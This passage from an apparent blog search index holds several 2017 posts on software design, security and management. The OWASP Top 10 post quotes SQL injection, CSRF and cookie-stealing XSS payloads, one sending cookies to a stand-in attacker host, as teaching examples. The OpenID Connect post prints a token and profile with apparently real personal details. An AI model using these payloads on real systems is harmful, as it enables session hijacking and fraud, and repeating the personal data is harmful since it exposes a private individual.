effects) Aggregate Aggregate is a domain pattern used to define object ownership and boundaries.\nAn aggregate is a cluster of associated objects that we treat as a unit for the purpose of data changes.\nTips:\nAggregates can connect only by the root Ref object to another object by using id can avoid cascading change problem. Don't overlook using FKs for non-root entities. Too many FKs to non-root entities may suggest a problem Rule of cascading deletes: If the root is deleted and removed from memory, all the other objects from the aggregate will be deleted too, because there is no other object holding reference to any of them. It is possible for the root to pass transient references of internal objects to external ones, with the condition that the external objects do not hold the reference after the operation is finished. One simple way to do that is to pass copies of the Value Objects to external objects. Factory Factory is to create new objects and don't care about persistence.\nRepository Repository is to find and update existing objects which can use a factory to create its objects.\nRepository can also handle persistence.\nA repository represents all objects of certain type as a conceptual set… like a collection with more elaborate querying capability\nRepository, the purpose of which is to encapsulate all the logic needed to obtain object references.\nThe domain objects won’t have to deal with the infrastructure to get the needed references to other objects of the domain. They will just get them from the Repository and the model is regaining its clarity and focus.\nDomain event An object that is used to record a discrete event related to model activity within the system.\nWhile all events within the system could be tracked, a domain event is only created for event types which the domain experts care about.\nBenefits and Drawbacks of DDD Benefits of DDD:\nFlexible Customer's vision/perspective of the problem Path through a very complex problem Well-organized and easily tested code Business logic lives in one place Many great patterns to leverage Drawbacks of DDD:\nTime and Effort Discuss \u0026amp; model the problem with domain experts Isolate domain logic from other parts of application Learning curve New principles New patterns New processes Only makes sense when there is complexity in the problem Not just CRUD or data-driven applications Not just technical complexity without business domain complexity Team or Company Buy-in to DDD Reference Web sites:\nDomainlanguage.com\nhttp://dddcommunity.org/\nNavigation Map:\nWritten by Binwei@Gdynia\n","link":"http://localhost:1313/post/2017/domain_driven_design_introduction/","section":"post","tags":["architecture","process"],"title":"Domain Driven Design: Introduction"},{"body":"Authenticate Node.js App by OpenId Connect Published: Jul 09, 2017\nTags: security\nCategory: ComputerScience\nOpenID Connect (OIDC) is an authentication layer on top of OAuth 2.0; while OAuth 2.0 is an authorization framework. The standard is controlled by the OpenID Foundation. This blog post will go through an example to use your google account to login a Node.js app by using OpenID Connect.\nTable of Contents Authentication vs Authorization 'Jargon' explanations OpenID OAuth OpenID Connect Setup Google Account Setup Node.Js App Authentication vs Authorization Authentication and Authorization are big topics, this blog only touches the basic and will have follow-up blogs to explain the details. If you are still confused about the difference between authentication and authorization, the followings are the explanations.\nAuthentication: is the process of ascertaining that somebody really is who he claims to be.\nAuthorization: refers to rules that determine who is allowed to do what.\n'Jargon' explanations If you are confused about the difference between various protocols, e.g. OpenID, OAuth, OpenID Connect, don't worry. It is a common challenge to most people.\nOpenID Authentication is delegated:\nServer A wants to authenticate user U, but U's credentials (e.g. U's name and password) are sent to another server, B, that A trusts (at least, trusts for authenticating users).\nIndeed, server B makes sure that U is indeed U, and then tells to A: \u0026quot;ok, that's the genuine U\u0026quot;.\nOAuth Authorization is delegated:\nEntity A obtains from entity B an \u0026quot;access right\u0026quot; which A can show to server S to be granted access; B can thus deliver temporary, specific access keys to A without giving them too much power.\nYou can imagine an OAuth server as the key master in a big hotel; he gives to employees keys which open the doors of the rooms that they are supposed to enter, but each key is limited (it does not give access to all rooms); furthermore, the keys self-destruct after a few hours.\nOpenID Connect To some extent, authorization can be abused into some pseudo-authentication, on the basis that if entity A obtains from B an access key through OAuth, and shows it to server S, then server S may infer that B authenticated A before granting the access key. So some people use OAuth where they should be using OpenID. This schema may or may not be enlightening; but I think this pseudo-authentication is more confusing than anything.\nOpenID Connect does just that: it abuses OAuth into an authentication protocol.\nIn the hotel analogy: if I encounter a purported employee and that person shows me that he has a key which opens my room, then I suppose that this is a true employee, on the basis that the key master would not have given him a key which opens my room if he was not.\nOpenID Connect standardize how authentication with OAuth2 works\nOpenID connect is built on top of Oauth 2.0 it contains authorization code flow and implicit flow standard scopes and claims token type is JWT (Json web token) ID token UserInfo endpoint Simple Supports multiple Relying Party (client) types Optional: encryption, discovery, dynamic client registration \u0026amp; session management http://openid.net/connect\nSetup Google Account Since this blog uses google account to do the login, so let's setup the account first.\nGo to the following URL:\nhttps://console.developers.google.com/apis/credentials\nCreate credential Create OAuth client id Ensure the redirect URL is setup correctly, e.g. http://localhost:5000/oidc-client-sample.html\nThis redirect URL will be used in the next chapter.\nTest the google authentication first by using auth0.com: https://auth0.com/docs/connections/social/google\nIf your manage to connect to the google account, then it's time to move to the next chapter.\nSetup Node.Js App In this blog, the focus in on OpenID Connect, then we will not build Node.JS app from scratch. Let's use the existing git repository: https://github.com/IdentityModel/oidc-client-js\nThen follow the steps:\nClone a local git repository Install the modules by: npm i Modify the code in example/oidc-client-sample.js 1var settings = { 2 authority: \u0026#39;https://accounts.google.com\u0026#39;, 3 client_id: \u0026#39;xxxxx\u0026#39;, 4 redirect_uri: \u0026#39;http://localhost:5000/oidc-client-sample.html\u0026#39;, 5 post_logout_redirect_uri: \u0026#39;http://localhost:5000/oidc-client-sample.html\u0026#39;, 6 response_type: \u0026#39;id_token token\u0026#39;, 7 scope: \u0026#39;openid email\u0026#39;, 8 9 filterProtocolClaims: true, 10 loadUserInfo: true 11}; Start the Node.JS app: npm start Test the app in browser: localhost:5000 Click the signin button to sign by using your google account Click processignin response button to get the response If everything goes well, you are suppose to see the following response content.\n1signin response 2{ 3 \u0026#34;state\u0026#34;: { 4 \u0026#34;bar\u0026#34;: 15 5 }, 6 \u0026#34;id_token\u0026#34;: \u0026#34;eyJhbGciOiJSUzI1NiIsImtpZCI6IjAwOThiMzFlNDA2NTE0OTNjZDA4YzFkYjA1NmQ2ZGI2YWU5NTY1MzMifQ.eyJhenAiOiI2MjQyNjc2NTM5MDgtcTllNDZ2dmU2Mzk3aHBvcHZ2NzZ0azk4bWlkN2EwY3EuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCJhdWQiOiI2MjQyNjc2NTM5MDgtcTllNDZ2dmU2Mzk3aHBvcHZ2NzZ0azk4bWlkN2EwY3EuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCJzdWIiOiIxMDc0Njc3ODM4NTgxMzE3ODA2MTAiLCJlbWFpbCI6InN1bW1lcnNub3dlQGdtYWlsLmNvbSIsImVtYWlsX3ZlcmlmaWVkIjp0cnVlLCJhdF9oYXNoIjoiZ3lzNm5uX2VobVVaR0FoV0FFZGFMUSIsIm5vbmNlIjoiMTc1ZDEyOTY2MzBkNGI2NmIzMDBlNDY0OTg1YzBiMjAiLCJpc3MiOiJodHRwczovL2FjY291bnRzLmdvb2dsZS5jb20iLCJpYXQiOjE0OTk2MDY4OTMsImV4cCI6MTQ5OTYxMDQ5M30.XJmRpaf5VLBZIV9EdlhR_m0zlmkkbwdf8_ekXjsseCzX1gMdTDgJSea4paIsakPkZbsoUz3y2yEg2qg5Had9aEicHqgU0YjEGIRmjAToYhDWsI20Eb0RVfNmKaHLS9R7SRoVuMsmO7cvpCZumr0UIWyX3ZY1lOpk0e2W-hJegLoya-esijp9ZajcFS-M3oNtPVZISVxRi0uTMaFvmSE3yM-_15YczLbkHiJWlblvEMbiCxbsi9J6AsEl5z8v5MYfuac0Nr7I3SHgbM2tUc0LFMhwCDGAAf7MomcuHLL6SVA73V7iS5Qiqe1DeYwXCf4JjiN9qqnMz5mI8BMI3v0i4g\u0026#34;, 7 \u0026#34;session_state\u0026#34;: \u0026#34;6b51bc71b013627ec110cb21b7ce19846399ae2d..28cf\u0026#34;, 8 \u0026#34;access_token\u0026#34;: \u0026#34;\u0026#34;, 9 \u0026#34;token_type\u0026#34;: \u0026#34;Bearer\u0026#34;, 10 \u0026#34;profile\u0026#34;: { 11 \u0026#34;azp\u0026#34;: \u0026#34;624267653908-q9e46vve6397hpopvv76tk98mid7a0cq.apps.googleusercontent.com\u0026#34;, 12 \u0026#34;sub\u0026#34;: \u0026#34;107467783858131780610\u0026#34;, 13 \u0026#34;email\u0026#34;: \u0026#34;summersnowe@gmail.com\u0026#34;, 14 \u0026#34;email_verified\u0026#34;: true, 15 \u0026#34;name\u0026#34;: \u0026#34;Summer Snow\u0026#34;, 16 \u0026#34;given_name\u0026#34;: \u0026#34;Summer\u0026#34;, 17 \u0026#34;family_name\u0026#34;: \u0026#34;Snow\u0026#34;, 18 \u0026#34;profile\u0026#34;: \u0026#34;https://plus.google.com/107467783858131780610\u0026#34;, 19 \u0026#34;picture\u0026#34;: \u0026#34;https://lh6.googleusercontent.com/-fC9bhpKev6k/AAAAAAAAAAI/AAAAAAAAATo/maihymGPzVM/photo.jpg\u0026#34;, 20 \u0026#34;gender\u0026#34;: \u0026#34;male\u0026#34; 21 }, 22 \u0026#34;expires_at\u0026#34;: 1499610496 23} Congratulations, you managed to get your Node.JS app authenticated by your google account!\nYou can also have a check of the following git repository, which is a simplified version. https://github.com/wubw/Codelab/tree/master/openidconnect\nWritten by Binwei@Oslo\n","link":"http://localhost:1313/post/2017/authenticate_by_openidconnect/","section":"post","tags":["security"],"title":"Authenticate Node.js App by OpenId Connect"},{"body":"Security: Owasp Top 10 Published: Jul 05, 2017 Tags: security Category: ComputerScience\nThe Open Web Application Security Project (OWASP) is an open community dedicated to enabling organizations to develop, purchase, and maintain applications and APIs that can be trusted. The goal of the Top 10 project is to raise awareness about application security by identifying some of the most critical risks facing organizations. This blog is based on 2013 version, while 2017 version will come very soon.\nTable of Contents 1. Injection Injection has many types:\nSQL injection NoSQL injection Command injection Code injection Path traversal ORM injection XML injection XPath injection Example A web server makes a query string like the following:\n1String query = \u0026#34;SELECT * FROM accounts WHERE custID=\u0026#39;\u0026#34; + request.getParameter(\u0026#34;id\u0026#34;) + \u0026#34;\u0026#39;\u0026#34;; The attacker modifies the ‘id’ parameter value in her browser to send: ' or '1'='1.\nHow to prevent White-list (untrusted data): What input do we trust? Does it adhere to expected pattern? Use safe API which provides parameterized interface Escape special character Positive or 'white list' input validation 2. Broken authentication and session management It means session management assets like user credentials and session IDs are not properly protected.\nExample If a web site put the token into the query string:\nhttp://example.com/sale/saleitems;jsessionid=2P0OC2JSNDLPSKHCJUN2JV?dest=Hawaii\nThen if the user share the link with others, the token/session id will be used by others.\nThere are other ways to hack the authentication and session management system.\nAuth cookie theft:\nExploit an XSS risk Retrieve it from the victim's PC Sniff it over an insecure connection Account management attack:\nBrute force the login Exploit password reset Discover weak credentials Session ID theft:\nCopy and paste a URL with it Send it via an insecure email Retrieve it from a log How to prevent Protect the cookies:\nUse the HttpOnly flag (HttpOnly is an additional flag included in a Set-Cookie HTTP response header, If the HttpOnly flag (optional) is included in the HTTP response header, the cookie cannot be accessed through client side script) Make sure they're flagged as 'secure' Decrease the window of risk:\nExpire sessions quickly Re-challenge the user on key actions Other ways:\nAuthentication must be over TLS Passwords policy \u0026quot;Secure\u0026quot; error messages Multiple-factor authentication CAPTCHA Block accounts Restore passwords No session identifier in URL Use TLS Logout Close browser window Secure passwords storage: Do not forget salt; SHA-256, SHA-512; PBKDF2, bcrypt, scrypt 3. Cross-site scripting (XSS) XSS has the following types:\nStored XSS Reflected XSS DOM Based XSS Example If the web server generate the content by using following code:\n1(String) page += \u0026#34;\u0026lt;input name=\u0026#39;creditcard\u0026#39; type=\u0026#39;TEXT\u0026#39; value=\u0026#39;\u0026#34; + request.getParameter(\u0026#34;CC\u0026#34;) + \u0026#34;\u0026#39;\u0026gt;\u0026#34;; The attacker modifies the ‘CC’ parameter in his browser to:\n1\u0026#39;\u0026gt;\u0026lt;script\u0026gt;document.location= \u0026#39;http://www.attacker.com/cgi-bin/cookie.cgi? foo=\u0026#39;+document.cookie\u0026lt;/script\u0026gt;\u0026#39;. This attack causes the victim’s session ID to be sent to the attacker’s website, allowing the attacker to hijack the user’s current session.\nHow to prevent Validation: Xxs-filters; Secure-filters; Xss; Validator-js HttpOnly cookies Helmet-csp (Content Security Policy) 4. Insecure direct object references Insecure direct object reference has the vulnerability to let the hacker get to know the internal system design.\nExample If the web server has the following code:\n1var messageId = req.params.messageId; 2messagesDAO.getById(messageId, function(error, message) 3{ 4 return res.render(\u0026#34;message\u0026#34;, message); 5} The hacker can use: http://site.com/view-message?messageId=1\nHow to prevent Use per user or session indirect object references. Check permissions on all application's layers Testing \u0026amp; Code review 5. Security misconfiguration Example The app server admin console is automatically installed and not removed. Default accounts aren’t changed. Attacker discovers the standard admin pages are on your server, logs in with default passwords, and takes over.\nHow to prevent Use following tools:\nAnsible, chef, puppet Helmet Hpp Cors Node-ipgeoblock Express-limiter Safe-regex 6. Sensitive data exposure Relevant types:\nSniffing Insecure cryptographic storage Example The password database uses unsalted hashes to store everyone’s passwords. A file upload flaw allows an attacker to retrieve the password file. All of the unsalted hashes can be exposed with a rainbow table of precalculated hashes.\nInsufficient use of SSL\nlogin not loaded over HTTPS Mixed mode Cookies not sent securely Bad crypto\nIncorrect password storage Poor protection of keys Weak algorithm chosen Other exposure risks\nBrowser auto-complete Leaked via logs Disclosure via URL How to prevent Always use TLS (TLS 1.1 and TSL 1.2) Secured control only over HTTPS HTTP content in HTTPS pages Use cookie's Secure attribute Minimize sensitive data collection Use strong crypto storage Use Javascript Cryptography:\nCrypto Sjcl (Stanford) Crypto-js Node-forge Web Cryptography API PolyCrypt 7. Missing function level access control Relevant types:\nSecurity through obscurity Checking permissions only in UI Missing permissions check in helper services Relevant questions:\nDoes the UI show navigation to unauthorised functions? Are server side authentication or authorization checks missing? Are server side checks done that solely rely on information provided by the attacker? Are system or diagnostic resources accessible without proper authorisation? Will \u0026quot;force browsing\u0026quot; disclosure unsecured resources? Example Attacker uses automated tool like OWASP ZAP or SQLMap to detect vulnerabilities and possibly exploit them.\nHow to prevent Check permission on all application's layer Authentication middleware Testing \u0026amp; Code review Define a clear authorisation model Check for forced browsing Always test unprivileged roles 8. Cross-site request forgery (CSRF) CSRF indicates token vulnerability.\nExample The application allows a user to submit a state changing request that does not include anything secret.\nFor example:\n1http://example.com/app/transferFunds?amount=1500 \u0026amp;destinationAccount=4673243243 So, the attacker constructs a request that will transfer money from the victim’s account to the attacker’s account, and then embeds this attack in an image request or iframe stored on various sites under the attacker’s control:\n1\u0026lt;img src=\u0026#34;http://example.com/app/transferFunds? amount=1500\u0026amp;destinationAccount=attackersAcct#“ width=\u0026#34;0\u0026#34; height=\u0026#34;0\u0026#34; /\u0026gt; If the victim visits any of the attacker’s sites while already authenticated to example.com, these forged requests will automatically include the user’s session info, authorizing the attacker’s request.\nBTW, iframe means inline frame is used to embed another document within the current HTML document.\nHow to prevent Include the unique token in a hidden field. This includes the value in the body of the HTTP request, avoiding its exposure in the URL. Employ anti-forgery tokens Validate the referrer Use csurf 9. Using components with known vulnerabilities If you build your app by using 3rd party components, the know vulnerabilities of the components impact you. See following links:\nhttps://nodesecurity.io https://snyk.io http://cve.mitre.org https://nvd.nist.gov https://www.exploit-db.com https://www.cvedetails.com 10. Unvalidated redirects and forwards Unvalidated url redirects and forwards may also cause problems.\nExample Let's say if your web site contains following code:\n1app.get(\u0026#34;/login\u0026#34;, function(req, res, next) { 2 return res.redirect(req.query.url); 3}); http://site.com/login?url=/admin\nHacker can provide a url which looks exactly the same as the original web page which asks for user name/password.\nHow to prevent Use a URL whitelist Use indirect references Check the referrer Do not use redirects Do not use parameters to create redirect link Validate destination parameter: valid-url References Other valuable references to look:\nhttps://github.com/OWASP/NodeGoat https://github.com/cr0hn/vulnerable-node https://github.com/clarkio/vulnerable-app https://github.com/toolness/security-adventure https://github.com/bkimminich/juice-shop https://www.owasp.org/index.php/ Written by Binwei@Oslo\n","link":"http://localhost:1313/post/2017/security_owasp_top_10/","section":"post","tags":["security"],"title":"Security: Owasp Top 10"},{"body":"Kotter-Binwei Change Model Published: May 25, 2017 Tags: process Category: Management\n\u0026quot;Change is the only constant.\u0026quot; – Heraclitus, Greek philosopher. Kotter 8-step change model will help you to implement changes powerfully and successfully. In addition, Binwei adds 2 more steps to help you figure out whether you are doing the right changes. To implement right changes is even more important in the current changing world.\nKotter 8-step change model Step 1: Create Urgency Step 2: Form a Powerful Coalition Step 3: Create a Vision for Change Step 4: Communicate the Vision Step 5: Remove Obstacles Step 6: Create Short-term Wins Step 7: Build on the Change Step 8: Anchor the Changes in Corporate Culture The above 8 steps will help you to implement the changes in the corporation. You can find a lot of content from internet.\nBinwei 2 more steps It will cause huge damage to the corporation if wrong changes are implemented. Kotter's change model does not touch that.\nUnder the name of 'innovation', it is easy that wrong changes be accepted and implemented. If the changes are wrong, then they are 'poison' rather than 'innovation'. Wrong changes need to be removed or stopped as soon as possible.\nSet meaningful measurement Changes shall be meaningful. They need to bring value to your customer, they need to improve corporation efficiency.\nIf you cannot find meaningful measurement for your changes, which may mean your changes are meaningless or even harmful.\nFor instance, you want a service to be widely used in the corporation, a 'meaningless' measurement can be 'how many times it is used'. The problem of such kind of measurement is it does not mention it helps someone at all and how. A 'meaningful' measurement will mention custom satisfaction improvement, the revenue gain, the efficiency gain etc at least.\nSet threshold The world is so complex that most of us are not that smart can foresee everything. Don't be too confident about your changes.\nA smart way is to set a reasonable threshold which is linked to your meaningful measurement with a reasonable timeline.\nIf the threshold is reached, then it is time to review your changes. It can be a signal your previous assumption on your changes is incorrect, maybe it is good idea to stop the changes or do it in different way.\nWritten by Binwei@Shanghai\n","link":"http://localhost:1313/post/2017/kotter_binwei_change_model/","section":"post","tags":["process"],"title":"Kotter-Binwei Change Model"},{"body":"Work in Big Company Published: May 17, 2017 Tags: chinese, booknotes Category: Management\n'Hacker and Painter' is a fantastic book for people work in IT industry, which enlightens me quite a lot. One point of view in this book is about the 'dark side' to work in big company.\n测量贡献 大公司最大的困扰，就是无法准确测量每个员工的贡献。 它会把所有人的贡献平均化。\n销售员是一个例外。 他们产生的收入，很容易测量，他们的薪水往往是销售额的一个百分比。 如果一个销售员想更努力地工作，他马上就可以这样做，并且自动按比例得到更多的报酬。\n此外，还有一个职位是可以测量的，那就是高级的管理职位，他们对整家公司的表现负责。 高级经理就像销售员一样，不得不用数字证明自己。 一个表现糟糕的CEO，是不能推托说自己已经尽了全力。 如果公司的表现不好，就是他的表现不好。\n不幸的是，公司不可能对每个人都像销售员那样付薪。销售员是单独工作的，大多数雇员则是集体工作。\n假设有一家公司制造某种消费品，工程师为它做出各种功能，设计师为它设计一个漂亮的外壳，营销人员让顾客相信这是值得拥有的商品。 请问如何评价每个人对这个商品销售额的贡献？\n还有，上一代产品的工作人员，为这个公司树立了质量可靠的形象，请问最新产品的销售额有多少应该归功于他们？\n根本没有办法把所有人的贡献一一分解清楚。 你想更努力地工作，但是你的工作与其他许多人的工作混杂在一起，这就产生了问题。 在大公司中，个人的表现无法单独测量，公司里其他人会“平均化”你。\n你不能对老板说，我打算十倍努力地工作，请你把我的薪水也增加十倍吧！ 因为公司已经假定你在全力工作了，而且更重要的是：实际上，公司无法测量你的贡献。\n深层原因 但是，就算无法测量每个员工的贡献，却有办法得到近似值，那就是测量小团队的贡献。\n整家公司产生的收入是可以测量的，如果公司只有一个员工，那么就可以准确知道他的贡献了。 所以，公司越小，你就越能准确估计每个人的贡献。 一家创业公司，可能只有10个员工，那么影响收入的人员因子，最多也只有10。 这意味着，你最好找出色的人合作，因为他们的工作和你的一起平均计算。\n大公司就像巨型的古罗马战舰，一千个划船手共同划桨，推动它前进。 但是，两个因素使得它快不起来。\n一个因素是，每个划船手看不到自己更努力划桨有何不同 另一个因素是，一千人的团队使得任何个人的努力都被大大地平均化了。 如果你从一千人中，随便挑出10个人，把他们放在一条小船上，他们很可能会划得更快。 身强力壮的划船手，看到他个人对船的前进速度有显著影响，就会受到激励。 如果有人偷懒，其他人也很容易发现，并会对他提出抱怨。\n如果你从大船上挑选出10个最优秀的划船手，把他们组成一个团队，这时，十人小船的优势才会真正显示出来。 小团队带来的各种额外激励，会在他们身上发挥得淋漓尽致。 这里最重要的是，你挑选出了最优秀的划船手，每个人都是一千人中排在最前面1%的顶尖高手。 对他们来说，将自己的工作与其他高手的工作平均化，要比与平庸之辈的工作平均化，简直是太让人满意了。\n然后呢？ 这就是创业公司的真正意义。 理想情况下，你与其他愿意拼命工作的人，一起组成一个团队，共同谋取更高的回报（相比为大公司工作的情况）。 创业公司不仅仅是十个人的团队，而是十个同类人的团队。\nSteve Jobs曾经说过，创业的成败取决于最早加入公司的那十个人。 我基本同意这个观点，虽然我觉得，真正决定成败的，其实只是前五人。 小团队的优势，不在于它本身的小，而在于你可以选择成员。 我们不需要小村庄的那种\u0026quot;小\u0026quot;，而需要全明星第一阵容的那种\u0026quot;小\u0026quot;。\n团队越大，每个人的贡献就越接近于整体的平均值。\n所以，在不考虑其他因素的情况下，一个非常能干的人待在大公司里，可能对他本人是一件很糟的事情，因为他的表现被其他不能干的人拖累了。 当然，许多因素都会产生影响，比如这个人可能不太在乎回报，或者他更喜欢大公司的稳定。 但是，一个非常能干而且在乎回报的人，通常在同类人组成的小团队中，会有更出色的表现，自己也会感到更满意。\n当然这篇文章并不适合所有人。“有些人”就适合待在大公司。 在大公司中，你只要一般性地努力工作，就能得到意料之中的薪水。 你不能明显的无能或懒惰，但是谁也没觉得你会把全部精力投入工作。\nWritten by Binwei@Oslo\n","link":"http://localhost:1313/post/2017/work_in_big_company/","section":"post","tags":["chinese","booknotes"],"title":"Work in Big Company"},{"body":"","link":"http://localhost:1313/tags/lean/","section":"tags","tags":null,"title":"Lean"},{"body":"Lean Toolkit for Software Development Published: May 16, 2017 Tags: lean, process Category: Management\nLean has huge impact on current software industry. No matter your team adopts Devops, Scrum, Kanban or other Agile methodologies, you can find impact from Lean methodology. Even though Lean was invented decades ago, the concepts are still shining and toolkit are still very useful.\nTable of Contents Identify Bottleneck Any improvements made anywhere besides the bottleneck are an illusion. -- Mary Poppendieck\nYour software, team, organization's performance is determined by the bottleneck. Identify the bottleneck first in your optimization task, normally identifying bottleneck is the most difficult part.\nBuild Quality in The best way to develop low-cost, high-quality software is to write less code. -- Mary Poppendieck\nLess code does not only mean to avoid unnecessary features, but also cleaner code and reuse as much as possible.\nQuality means realization of purpose or fitness for use rather than conformance to requirements.\nEstablish Information Flow Perceived integrity: is affected by the customer's whole experience of a system.\nConceptual integrity: means that a system's central concepts work together as a smooth, cohesive whole.\nPerceived integrity is a reflection of the integrity of the information flow from customers and users to developers. Conceptual integrity is a reflection of the integrity of the upstream/downstream technical information flow\nThe way to build a system with high perceived and conceptual integrity is to have excellent information flows both from customer to development team and between the upstream and downstream processes of the development team.\nSmaller systems should be developed by a single team that has immediate access to the people who will judge the system's integrity. The team should use short iterations and show each iteration to a broad range of people who will know integrity when they see it, so they can make course corrections based on feedback. Customer tests provide excellent customer–developer communication. Complex system should be represented using a language and a set of models that the customers understand and the programmers can use without intervening refinement. Large systems should have a master developer who has deep customer understanding and excellent technical credentials, and whose role is to facilitate the design as it emerges, representing the customer's interests to the developers. Suppose a developer has a conversation with a customer about details of a feature. The conversation should not be considered complete until it is expressed as a customer test. By documenting the design in tests, developers can write code with a clear understanding of exactly what it is supposed to do. This is a good way to refine thinking and help developers write code with conceptual integrity. Decide as Late as Possible Postpone the decision as much as possible, no matter in your requirement, design, architecture, or implementation work.\nOptions thinking is an important tool in software development as long as it is accompanied by recognition that options are not free and it takes expertise to know which options to keep open.\nEmpower Front-line Lean thinking capitalizes on the intelligence of front-line workers, believing that they are the ones who should determine and continually improve the way they do their jobs.\nWe believe that the critical factor in motivation is not measurement, but empowerment: moving decisions to the lowest possible level in an organization while developing the capacity of those people to make decisions wisely.\nThe way to be sure that everything is measured is by aggregation, not disaggregation. That is, move the measurement one level up, not one level down.\nStay Cool Transferring practices from one environment to another is often a mistake. Instead, one must understand the fundamental principles behind practices and transform those principles into new practices for a new environment.\nToday's organizations are littered with failed improvement programs, whether they go by the name CMM, ISO9000, TQM, Six Sigma, or even Lean. It is notoriously difficult to implement successful improvement programs, and even more difficult to sustain them over time.\nStay cool with the hot process/technology, there is no 'silver bullet' in the world. You have to fully understand the pros and cons, whether it fits you and your organization, and then adopt reasonable actions accordingly.\nWritten by Binwei@Oslo\n","link":"http://localhost:1313/post/2017/lean_toolkit_for_software_development/","section":"post","tags":["process","lean"],"title":"Lean Toolkit for Software Development"},{"body":"The Mythical Deadline of Peopleware Man-month Published: May 14, 2017 Tags: booknotes, chinese Category: Management\nThis blog post is the book note of three famous books in project/people management in IT industry: The Mythical Man-month, The Deadline, Peopleware. They are enlightenment books to me on the management topics when I read these books decade ago. There are a lot of shinning points in these books, and I try to list them with my own thoughts. The book notes will be in Chinese, since I read the Chinese version that time.\nTable of Contents 管理重要要素 优质管理的四大要素：选择正确的人；为他们分配正确的工作；保持他们的积极性；帮助团队凝聚起来并保持团队的凝聚力。\n让一个人发挥自己的能力和才干，他就会发光。这正是管理的全部精髓。\n人月神话 用人月作为衡量一项工作的规模是一个危险和带有欺骗性的神话。它暗示着人员数量和时间是可以替换的。（除非它们之间不需要相互的交流）\n向进度落后的项目中增加人手，只会使进度更加落后。 --Brooks法则\n3个规则:\n成绩最好与成绩最差的人之间的成绩比是10：1. 最好选手成绩大约是中等选手成绩的2.5倍。 成绩中等以上的一半选手与另外一半选手的成绩比是2:1. 很多管理者总是在考虑成本/收益研究，他们懂得成本，但是他们对等式的另一端是什么却一无所知。他们没有从对“收益”的分析中实际获益。\n管理者需要对生产力进行衡量。\n当你需要对任何事情做出度量的时候，总会有这样或者那样的度量方法比选择干脆放弃度量要强。 一个不能对它自己规划的生产力进行评估的公司只是没有努力尝试而已。如果对生产力不进行衡量，那么出现任何一种情况你都不应该特别惊讶。因为你对企业的生产力根本没有最起码的认识。\nBinwei: 在这本伟大的人月神话写完了几十年之后，还是有那么多企业掉在了人月神话的陷阱中，岂不是可笑又可悲？\n生产力的提高 生产力必须定义为利润除以成本。 利润是可以观测到的美元存款和工作中的收入，成本是总成本，包括替换那些由于工作而疲惫不堪的人员的成本。\n永远都没有办法在短期内提高生产力。\n当你把一切都安排好以后，你能得到的生产力将是在你之前的管理者所做的长期投资的直接反映。 对于生产力，你惟一真正能够起到的影响就是：现在做长期投资，让你的后继者受益。 任何承诺立刻见效的东西都很可能是江湖游医所卖的万灵油。 这就像开始一个战役一样，在战役开始之前，管理者的绝大多数工作其实已经完成了。 总生产率依赖于四个因素：团队可用人员数、还没有融入团队的新成员数、交流损失和融合开销\n团队有一种潜力—— 随着共同工作的时间越来越长，团队能够逐渐消除交流损失。 成员们在一起经历很多事情，团队就会变得越来越健壮，甚至能够克服交流的损失。作为一个整体，团队能够比单个个体的简单加和做得更好。\n公司越没有生产力，人们就越会没有激情的火花，只会机械地工作，最优秀的人便会离开。\nBinwei: 如果一个企业设置的目标都是以短期的数字，那么又有谁愿意去提高长期的生产力呢？\n面试和招聘 寻找合适的人选。然后，不管你之后做错了什么，这个人都会拯救你。这就是管理最重要的艺术。\n不要试图单独去招聘 循序渐进安排任务难度 征求推荐：你最希望雇的那个人可能还知道其他很好的人选 多听，少说 事先把面试材料整理好 Binwei: 招对的人是重中之重，而且整个团队需要匹配-参考西天取经队伍\n工作压力和加班 人们在受到时间重压的时候不是工作得更好，只是工作得更快。\n短期的压力乃至于加班可能是有用的策略，因为它们能使员工集中精力，并且让他们感到工作的重要性。但是长期的压力肯定是错误的。 压力下的人不能更快地思考。增加加班时间只会降低生产力。加班工作带来的负面影响大于收益。 加班不是提升平均工作质量的手段，而是增加工作时间数量的手段。\n总之，在众多软件项目中，缺乏合理的进度安排是造成项目滞后的最主要原因，它比其他所有因素加起来的影响还要大。 如果人们被锁定在不能赢的局面下，他们的工作效率不会很高。\n不要让你的员工疲于奔命，透支健康，即使你赢得战役和但是输掉战争\nBinwei: 加班与压力因人而异，对于有些有进取心的人来说，少量的加班并带有补偿是件极好的事情。 但是企业千万不要糊涂地让加班发生在哪些问题重重的项目上，对于那些项目，人，流程，架构才是关键问题。\n高效工作 经理的职能不是强迫人们工作，而是让人们有可能工作。\n顺流（flow）是一种陷入沉思的状态。在这种状态下，有一种精神欢快的轻松意识，一种大部分情况下都感觉不到时间在流逝的意识。 这种flow状态需要不被打断。\n只要员工们还拥挤在充满噪音、缺乏办公设施、破坏性的工作场所，除了改进工作场所之外没有别的东西更值得改进了。\n选择合适的交流工具： 电话和电子邮件的最大区别在于，电话干扰工作而电子邮件不干扰工作，收件人可以在他（或她）合适的时间处理邮件。\n管理上的最大罪行是浪费人的时间。 听起来应该是容易避免的罪行，但是不是。作为一个经理你有一些自己的需求，并且这些需求与你想保留和宽松地使用你手下的时间的意愿正好相反。\nBinwei: 避免无谓的会议以及任务，选择有效沟通方式，提供良好工作环境。\n胶冻团队 我们停止谈论建立团队，并且将话题改为培养团队。农业现象来看是对的：它们不是全部可以控制的。\n胶冻团队是一群紧密结合在一起的人，其整体大于部分的总和。 如果团队紧密地胶冻在一起的工作小组是令人感觉愉快的，人们使用“团队”一词，如果它代表着威胁则用“私党”一词。 害怕私党是一种管理上不安全的迹象。越不安全，则私党的概念越可怕。理由是：经理们不是他们团队的真正成员。 在最好的公司里，自然权威在所有的方向生效。经理被认为更擅长于某些事情，并且在做这些事情时令人放心，可能是制定总体方向、谈判或雇佣。每个员工都被认为有一些领域的专业知识，并且被公认为那个领域的自然权威。在这个思想开放式管理的氛围中，团队有胶冻的最佳机会。 除非必要，否则就不要自己去凝聚一个团队：出去找一个已经成型的团队来用。\n一个组织良好的团队，这应该被视为项目最主要的收获之一。 当你最后评价一个项目时，不应该仅仅根据生产出的软件，还要看它是否造就了至少一个牢固而优秀的团队，一个有愿望、有激情去投入另一个项目的团队。\n对应胶冻团队的是自杀团队\n团队自杀的简短技术列表：防范性管理；官僚作风；物理隔离；员工的时间分割；产品质量要求降低；虚张声势的最后期限；私党控制。 大多数团队自杀的危害形式表现为强烈地贬低某项工作或者贬低做此项工作的人。\n以下是一些倾向于产生团队自杀性负作用的管理行为：年薪或绩效考评；目标管理（Management by 